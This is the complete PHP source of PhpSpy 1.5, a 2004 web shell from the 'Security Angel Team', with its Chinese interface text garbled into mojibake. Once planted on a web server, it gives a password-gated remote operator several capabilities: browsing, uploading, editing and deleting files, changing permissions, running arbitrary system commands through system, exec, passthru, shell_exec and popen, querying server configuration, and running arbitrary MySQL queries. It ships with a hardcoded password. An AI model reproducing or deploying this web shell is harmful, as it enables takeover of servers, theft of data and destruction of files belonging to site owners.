<?php
/*
+--------------------------------------------------------------------------+
| PhpSpy Version:1.5                                                       |
| Codz by Angel                                                            |
| (c) 2004 Security Angel Team                                             |
| http://www.4ngel.net                                                     |
| ======================================================================== |
| Team:  http://www.4ngel.net                                              |
|        http://www.bugkidz.org                                            |
| Email: 4ngel@21cn.com                                                    |
| Date:  July 22st(My mother's birthday), 2004                             |
+--------------------------------------------------------------------------+
*/
error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*=====================  =====================*/

// ǷҪ֤,1ΪҪ֤,Ϊֱӽ.ѡЧ
$admin['check']="1";

// ֤ʽ,1Ϊ Session ֤, Cookie֤
// Ĭϲ Session ֤,½,Ϊ Cookie֤
$admin['checkmode']="1";

// Ҫ֤,޸ĵ½
$admin['pass']="hkuser";

/*===================== ý =====================*/


//  register_globals = off Ļ¹
if ( function_exists('ini_get') ) {
	$onoff = ini_get('register_globals');
} else {
	$onoff = get_cfg_var('register_globals');
}
if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

/*===================== ֤ =====================*/
if($admin['check']=="1") {
	if($admin['checkmode']=="1") {
	/*------- session ֤ -------*/
		session_start();
		if ($_GET['action'] == "logout") {
			session_destroy();
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$_SERVER['PHP_SELF']."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">עɹ......<p><a href=\"".$_SERVER['PHP_SELF']."\">Զ˳򵥻˳&gt;&gt;&gt;</a></span>";
			exit;
		}
		if ($_POST['action'] == "login") {
			$adminpass=trim($_POST['adminpass']);
			if ($adminpass==$admin['pass']) {
				$_SESSION['adminpass'] = $admin['pass'];
				echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$_SERVER['PHP_SELF']."\">";
				echo "<span style=\"font-size: 12px; font-family: Verdana\">½ɹ......<p><a href=\"".$_SERVER['PHP_SELF']."\">Զת򵥻&gt;&gt;&gt;</a></span>";
				exit;
			}
		}
		if (session_is_registered('adminpass')) {
			if ($_SESSION['adminpass']!=$admin['pass']) {
				loginpage();
			}
		} else {
			loginpage();
		}
	} else {
	/*------- cookie ֤ -------*/
		if ($_GET['action'] == "logout") {
			setcookie ("adminpass", "");
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$_SERVER['PHP_SELF']."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">עɹ......<p><a href=\"".$_SERVER['PHP_SELF']."\">Զ˳򵥻˳&gt;&gt;&gt;</a></span>";
			exit;
		}
		if ($_POST['action'] == "login") {
			$adminpass=trim($_POST['adminpass']);
			if ($adminpass==$admin['pass']) {
				setcookie ("adminpass",$admin['pass'],time()+(1*24*3600));
				echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$_SERVER['PHP_SELF']."\">";
				echo "<span style=\"font-size: 12px; font-family: Verdana\">½ɹ......<p><a href=\"".$_SERVER['PHP_SELF']."\">Զת򵥻&gt;&gt;&gt;</a></span>";
				exit;
			}
		}
		if (isset($_COOKIE['adminpass'])) {
			if ($_COOKIE['adminpass']!=$admin['pass']) {
				loginpage();
			}
		} else {
			loginpage();
		}
	}

}//end check
/*===================== ֤ =====================*/

// ж magic_quotes_gpc ״̬
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

// ļ
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('Ҫµļ!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP3 Generated Data');
		@readfile($downfile);
		exit;
	}
}

// Ŀ¼(ļϵͳ)
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// ȡǰ·
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// ж϶д
if (dir_writeable($nowpath)) {
	$dir_writeable = "д";
} else {
	$dir_writeable = "д";
}

$dis_func = get_cfg_var("disable_functions");
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\">PHPINFO</a>" : "";
$shellmode=(!get_cfg_var("safe_mode")) ? " | <a href=\"?action=shell\">WebShellģʽ</a>" : "";
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>PhpSpy Ver 1.5</title>
<style type="text/css">
.maintable {
	background-color: "#FFFFFF";
	border: "1px solid #115173";
}
body,td {
	font-family: "sans-serif";
	font-size: "12px";
	line-height: "150%";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
}
a:link,
a:visited,
a:active{
	color: "#000000";
	text-decoration: underline;
}
a:hover{
	color: "#465584";
	text-decoration: none;
}
.firstalt	{BACKGROUND-COLOR: "#EFEFEF"}
.secondalt	{BACKGROUND-COLOR: "#F5F5F5"}
</style>
</head>

<body style="table-layout:fixed; word-break:break-all">
<center>
<p><strong><a href="?action=logout">עỰ</a> | <a href="?action=dir">ظĿ¼</a> | <a href="?action=phpenv">PHP</a><?=$phpinfo?><?=$shellmode?> | <a href="?action=sql">SQLѯ</a> | <a href="http://www.4ngel.net" target="_blank" title="ش˳">Version 1.5</a></strong></p>
<?php
if ($_GET['action'] == "phpinfo") {
	$dis_func = get_cfg_var("disable_functions");
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() ѱ,鿴&lt;PHP&gt;";
	exit;
}
?>
<table width="760" border="0" cellpadding="0">
 <form action="" method="GET">
  <tr>  	
  	<td><p>·:<?=$pathname?><br>ǰĿ¼(<?=$dir_writeable?>,<?=substr(base_convert(@fileperms($nowpath),10,8),-4);?>):<?=$nowpath?>
        <br>תĿ¼:
        <input name="dir" type="text" class="INPUT">
        <input type="submit" class="INPUT" value="ȷ"> ֧־··
    </p></td>
  </tr>
 </form>
 <form action="?dir=<?=urlencode($dir)?>" method="POST" enctype="multipart/form-data">
  <tr>
    <td colspan="2">ϴļǰĿ¼:
      <input name="uploadmyfile" type="file" class="INPUT">	<input type="submit" class="INPUT" value="ȷ">
      <input name="action" type="hidden" value="uploadfile"><input type="hidden" name="uploaddir" value="<?=$dir?>"></td>
  </tr>
  </form>
  <form action="?action=editfile&dir=<?=urlencode($dir)?>" method="POST">
  <tr>
    <td colspan="2">½ļڵǰĿ¼:
        <input name="newfile" type="text" class="INPUT" value="">
        <input type="submit" class="INPUT" value="ȷ">
        <input name="action" type="hidden" value="createfile"></td>
  </tr>
  </form>
  <form action="" method="POST">
  <tr>
    <td colspan="2">½Ŀ¼ڵǰĿ¼:
        <input name="newdirectory" type="text" class="INPUT" value="">
        <input type="submit" class="INPUT" value="ȷ">
        <input name="action" type="hidden" value="createdirectory"></td>
  </tr>
  </form>
</table>
<hr width="760" noshade>
<?php
/*===================== ִв ʼ =====================*/
echo "<p><b>\n";
// ɾļ
if(@$delfile!="") {
	if(file_exists($delfile)) {
		@unlink($delfile);
		echo "".$delfile." ɾɹ!";
	} else {
		echo "ļѲ,ɾʧ!";
	}
}

// ɾĿ¼
elseif($_POST['action'] == "rmdir") {
	if($deldir!="") {
		$deldirs="$dir/$deldir";
		if(!file_exists("$deldirs")) {
			echo "Ŀ¼Ѳ!";
		} else {
			deltree($deldirs);
		}
	} else {
		echo "ɾʧ!";
	}
}

// Ŀ¼
elseif($_POST['action'] == "createdirectory") {
	if(!empty($newdirectory)) {
		$mkdirs="$dir/$newdirectory";
		if(file_exists("$mkdirs")) {
			echo "Ŀ¼Ѵ!";
		} else {
			echo $msg=@mkdir("$mkdirs",0777) ? "Ŀ¼ɹ!" : "ʧ!";
			@chmod("$mkdirs",0777);
		}
	}
}

// ϴļ
elseif($_POST['action'] == "uploadfile") {
	echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadmyfile']['name']."") ? "ϴɹ!" : "ϴʧ!";
}

// ༭ļ
elseif($_POST['action'] == "doeditfile") {
	$filename="$dir/$editfilename";
	@$fp=fopen("$filename","w");
	echo $msg=@fwrite($fp,$_POST['filecontent']) ? "дļɹ!" : "дʧ!";
	@fclose($fp);
}

// ༭ļ
elseif($_POST['action'] == "editfileperm") {
	$fileperm=base_convert($_POST['fileperm'],8,10);
	echo $msg=@chmod($dir."/".$file,$fileperm) ? "޸ĳɹ!" : "޸ʧ!";
	echo " [".$file."] ޸ĺΪ:".substr(base_convert(@fileperms($dir."/".$file),10,8),-4)."";
}

// MYSQL
elseif($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "ݿӳɹ!";
	} else {
		echo mysql_error();
	}
}

// ִSQL
elseif($doquery) {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("ݿʧ");
	@mysql_select_db($dbname) or die("ѡݿʧ");
	$result = @mysql_query($_POST['sql_query']);
	if ($result) {
		echo "SQLɹִ";
	}else{
		echo ": ".mysql_error();
	}
	mysql_close();
}

// 鿴PHPò״
elseif($_POST['action'] == "viewphpvar") {
	echo "ò ".$_POST['phpvarname']." : ".getphpcfg($_POST['phpvarname'])."";
}

else {
	echo " Security Angel ȫ֯ angel[BST] , <a href=\"http://www.4ngel.net\" target=\"_blank\">http://www.4ngel.net</a> °汾.";
}

echo "</b></p>\n";
/*===================== ִв  =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="40%"><b>ļ</b></td>
    <td align="center" nowrap width="20%"><b>޸</b></td>
    <td align="center" nowrap width="12%"><b>С</b></td>
    <td align="center" nowrap width="8%"><b></b></td>
    <td align="center" nowrap width="20%"><b></b></td>
  </tr>
<?php
// Ŀ¼б
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
	$b="$dir/$file";
	$a=@is_dir($b);
	if($a=="1"){
		if($file!=".."&&$file!=".")	{
			$lastsave=@date("Y-n-d H:i:s",filemtime("$dir/$file"));
			$dirperm=substr(base_convert(fileperms("$dir/$file"),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\">$lastsave</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=deldir&dir=".urlencode($dir)."&deldir=".urlencode($file)."\">ɾ</a></td>\n";
			echo "</tr>\n";
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"5\" style=\"padding-left: 5px;\"><a href=\"?dir=".$dir."/".$file."\">ϼĿ¼</a></td>\n";
				echo "</tr>\n";
			}
		}
		$dir_i++;
	}
}//while
@closedir($dirs); 

// ļб
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
	$b="$dir/$file";
	$a=@is_dir($b);
	if($a=="0"){
		$size=@filesize("$dir/$file");
		$size=$size/1024 ;
		$size= @number_format($size, 3);    
		$lastsave=@date("Y-n-d H:i:s",filectime("$dir/$file"));
		@$fileperm=substr(base_convert(fileperms("$dir/$file"),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\"><a href=\"$dir/$file\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\">$lastsave</td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\">$size KB</td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?downfile=".urlencode($dir)."/".urlencode($file)."\"></a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">༭</a> | <a href=\"?dir=".urlencode($dir)."&delfile=".urlencode($dir)."/".urlencode($file)."\">ɾ</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}
@closedir($dirs); 

echo "<tr class=".getrowbg().">\n";
echo "  <td nowrap colspan=\"5\" align=\"right\">".$dir_i." Ŀ¼<br>".$file_i." ļ</td>\n";
echo "</tr>\n";
?>
</table>

<?php
}// end dir

elseif ($_GET['action'] == "editfile") {
	if($newfile=="") {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">½/༭ļ [<a href="?dir=<?=urlencode($dir)?>"></a>]</td>
  </tr>
  <form action="?dir=<?=urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center">ǰļ:<input class="input" type="text" name="editfilename" size="30"
value="<?=$editfile?>"> ļļ</td>
  </tr>  
  <tr class="firstalt">
    <td align="center"><textarea name="filecontent" cols="100" rows="20"><?=$contents?></textarea></td>
  </tr>  
  <tr class="secondalt">
    <td align="center"><input type="submit" value="ȷд" class="input">
      <input name="action" type="hidden" value="doeditfile">
      <input type="reset" value="" class="input"></td>
  </tr>
  </form>
</table>
<?php
}//end editfile

elseif ($_GET['action'] == "shell") {
	if (!get_cfg_var("safe_mode")) {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">WebShell Mode</td>
  </tr>
  <form action="?action=shell&dir=<?=urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center">ʾ:ȫ,дļ.Եõȫ.</td>
  </tr>
  <tr class="firstalt">
    <td align="center">
	  ѡִк:
	  <select name="execfunc" class="input">
		<option value="system" <? if ($execfunc=="system") { echo "selected"; } ?>>system</option>
		<option value="passthru" <? if ($execfunc=="passthru") { echo "selected"; } ?>>passthru</option>
		<option value="exec" <? if ($execfunc=="exec") { echo "selected"; } ?>>exec</option>
		<option value="shell_exec" <? if ($execfunc=="shell_exec") { echo "selected"; } ?>>shell_exec</option>
		<option value="popen" <? if ($execfunc=="popen") { echo "selected"; } ?>>popen</option>
	  </select>
	  :
      <input type="text" name="command" size="60" value="<?=$_POST['command']?>" class="input">
      <input type="submit" value="execute" class="input"></td>
  </tr>  
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} else {
			system($_POST['command']);
		}
	}
	?></textarea></td>
  </tr>  
  </form>
</table>
<?php
	} else {
?>
<p><b>Safe_Mode Ѵ, ޷ִϵͳ.</b></p>
<?php
	}
}//end shell

elseif ($_GET['action'] == "deldir") {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <form action="?dir=<?=urlencode($dir)?>" method="POST">
  <tr class="firstalt">
    <td align="center">ɾ <input name="deldir" type="text" value="<?=$deldir?>" class="input" readonly> Ŀ¼</td>
  </tr>  
  <tr class="secondalt">
    <td align="center">ע:Ŀ¼ǿ,˴βɾĿ¼µļ.ȷ?</td>
  </tr>  
  <tr class="firstalt">
    <td align="center">	  
	  <input name="action" type="hidden" value="rmdir">
	  <input type="submit" value="delete" class="input">
	</td>
  </tr>  
  </form>
</table>
<?php
}//end deldir

elseif ($_GET['action'] == "fileperm") {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">޸ļ [<a href="?dir=<?=urlencode($dir)?>"></a>]</td>
  </tr>
  <form action="?dir=<?=urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center"><input name="file" type="text" value="<?=$file?>" class="input" readonly> Ϊ:
      <input type="text" name="fileperm" size="20" value="<?=substr(base_convert(fileperms($dir."/".$file),10,8),-4)?>" class="input">
	  <input name="dir" type="hidden" value="<?=urlencode($dir)?>">
	  <input name="action" type="hidden" value="editfileperm">
	  <input type="submit" value="modify" class="input"></td>
  </tr>  
  </form>
</table>
<?php
}//end fileperm

elseif ($_GET['action'] == "sql") {
	$servername = isset($servername) ? $servername : '127.0.0.1';
	$dbusername = isset($dbusername) ? $dbusername : 'root';
	$dbpassword = isset($dbpassword) ? $dbpassword : '';
	$dbname = isset($dbname) ? $dbname : '';
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">ִ SQL </td>
  </tr>
  <form action="?action=sql" method="POST">
  <tr class="secondalt">
    <td align="center">Host:
    <input name="servername" type="text" class="INPUT" value="<?=$servername?>"> 
    User:
    <input name="dbusername" type="text" class="INPUT" size="15" value="<?=$dbusername?>">
    Pass:
    <input name="dbpassword" type="text" class="INPUT" size="15" value="<?=$dbpassword?>">
    DB:
    <input name="dbname" type="text" class="INPUT" size="15" value="<?=$dbname?>">
    <input name="connect" type="submit" class="INPUT" value=""></td>
  </tr>
  <tr class="firstalt">
    <td align="center"><textarea name="sql_query" cols="85" rows="10"></textarea></td>
  </tr>
  <tr class="secondalt">
    <td align="center"><input type="submit" name="doquery" value="ִ" class="input"></td>
  </tr>  
  </form>
</table>
<?php
}//end sql query

elseif ($_GET['action'] == "phpenv") {
	$upsize=get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "ϴ";

	$adminmail=(isset($_SERVER["SERVER_ADMIN"])) ? "<a href=\"mailto:".$_SERVER["SERVER_ADMIN"]."\">".$_SERVER["SERVER_ADMIN"]."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";

	$dis_func = get_cfg_var("disable_functions");
	if ($dis_func == "") {
		$dis_func = "No";
	}else {
		$dis_func = str_replace(" ","<br>",$dis_func);
		$dis_func = str_replace(",","<br>",$dis_func);
	}
	
	$phpinfo=(!eregi("phpinfo",$dis_func)) ? "Yes" : "No";

	$info[0]  = array("ʱ",date("Ymd h:i:s",time()));
	$info[1]  = array("","<a href=\"http://$_SERVER[SERVER_NAME]\" target=\"_blank\">$_SERVER[SERVER_NAME]</a>");
	$info[2]  = array("IPַ",gethostbyname($_SERVER["SERVER_NAME"]));
	$info[3]  = array("ϵͳ",PHP_OS);
	$info[5]  = array("ϵͳֱ",$_SERVER["HTTP_ACCEPT_LANGUAGE"]);
	$info[6]  = array("",$_SERVER["SERVER_SOFTWARE"]);
	$info[7]  = array("Web˿",$_SERVER["SERVER_PORT"]);
	$info[8]  = array("PHPзʽ",strtoupper(php_sapi_name()));
	$info[9]  = array("PHP汾",PHP_VERSION);
	$info[10] = array("ڰȫģʽ",getphpcfg("safemode"));
	$info[11] = array("Ա",$adminmail);
	$info[12] = array("ļ·",__FILE__);
	
	$info[13] = array("ʹ URL ļ allow_url_fopen",getphpcfg("allow_url_fopen"));
	$info[14] = array("̬ӿ enable_dl",getphpcfg("enable_dl"));
	$info[15] = array("ʾϢ display_errors",getphpcfg("display_errors"));
	$info[16] = array("Զȫֱ register_globals",getphpcfg("register_globals"));
	$info[17] = array("magic_quotes_gpc",getphpcfg("magic_quotes_gpc"));
	$info[18] = array("ʹڴ memory_limit",getphpcfg("memory_limit"));
	$info[19] = array("POSTֽ post_max_size",getphpcfg("post_max_size"));
	$info[20] = array("ϴļ upload_max_filesize",$upsize);
	$info[21] = array("ʱ max_execution_time",getphpcfg("max_execution_time")."");
	$info[22] = array("õĺ disable_functions",$dis_func);
	$info[23] = array("phpinfo()",$phpinfo);
	$info[24] = array("Ŀǰпռdiskfreespace",intval(diskfreespace(".") / (1024 * 1024)).'Mb');

	$info[25] = array("ͼδ GD Library",getfun("imageline"));
	$info[26] = array("IMAPʼϵͳ",getfun("imap_close"));
	$info[27] = array("MySQLݿ",getfun("mysql_close"));
	$info[28] = array("SyBaseݿ",getfun("sybase_close"));
	$info[29] = array("Oracleݿ",getfun("ora_close"));
	$info[30] = array("Oracle 8 ݿ",getfun("OCILogOff"));
	$info[31] = array("PREL﷨ PCRE",getfun("preg_match"));
	$info[32] = array("PDFĵ֧",getfun("pdf_close"));
	$info[33] = array("Postgre SQLݿ",getfun("pg_close"));
	$info[34] = array("SNMPЭ",getfun("snmpget"));
	$info[35] = array("ѹļ֧(Zlib)",getfun("gzclose"));
	$info[36] = array("XML",getfun("xml_set_object"));
	$info[37] = array("FTP",getfun("ftp_login"));
	$info[38] = array("ODBCݿ",getfun("odbc_close"));
	$info[39] = array("Session֧",getfun("session_start"));
	$info[40] = array("Socket֧",getfun("fsockopen"));
?>
<table width="760" border="0" align="center" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
 <form action="?action=phpenv" method="POST">
  <tr class="firstalt">
    <td style="padding-left: 5px;"><b>鿴PHPò״</b></td>
  </tr>
  <tr class="secondalt">
    <td style="padding-left: 5px;">ò(:magic_quotes_gpc):<input name="phpvarname" type="text" class="input" size="40"> <input type="submit" value="鿴" class="input"><input name="action" type="hidden" value="viewphpvar"></td>
  </tr>
 </form>
<?php
	for($a=0;$a<3;$a++){
		if($a == 0){
			$hp = array("server","");
		}elseif($a == 1){
			$hp = array("php","PHP");
		}elseif($a == 2){
			$hp = array("basic","֧״");
		}
?>
  <tr class="firstalt">
    <td style="padding-left: 5px;"><b><?=$hp[1]?></b></td>
  </tr>
  <tr class="secondalt">
    <td>
      <table width="100%" border="0" cellpadding="0" cellspacing="0">
<?
		if($a == 0){
			for($i=0;$i<=12;$i++){
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}elseif($a == 1){
			for($i=13;$i<=24;$i++){
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}elseif($a == 2){
			for($i=25;$i<=40;$i++){
				echo "<tr><td width=40% style=\"padding-left: 5px;\">".$info[$i][0]."</td><td>".$info[$i][1]."</td></tr>\n";
			}
		}
?>
      </table>
    </td>
  </tr>
<?
	}//for
echo "</table>";
}//end phpenv
?>
<hr width="760" noshade>
<table width="760" border="0" cellpadding="0">
  <tr>
    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
    <td align="right"><?php
	debuginfo();
	ob_end_flush();	
	?></td>
  </tr>
</table>
</center>
</body>
</html>

<?php

/*======================================================

======================================================*/

	// ½
	function loginpage() {
?>
		<style type="text/css">
		input {
			font-family: "Verdana";
			font-size: "11px";
			BACKGROUND-COLOR: "#FFFFFF";
			height: "18px";
			border: "1px solid #666666";
		}
		</style>
		<form method="POST" action="">
		<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20"><input type="hidden" name="action" value="login">
		<input type="submit" value="OK">
		</form>
<?php
		exit;
	}//end loginpage()

	// ҳϢ
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// ȥתַ
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// ɾĿ¼
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		echo @rmdir($deldir) ? "<b>Ŀ¼ɾɹ!</b>" : "<font color=\"#ff0000\">Ŀ¼ɾʧ!</font>";	
	} 

	// ж϶д
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// мıɫ滻
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// ȡǰļϵͳ·
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	// PHPò
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return No;
			break;
			case 1:
			return Yes;
			break;
			default:
			return $result;
			break;
		}
	}

	// 麯
	function getfun($funName) {
		return (false !== function_exists($funName)) ? Yes : No;
	}
?>
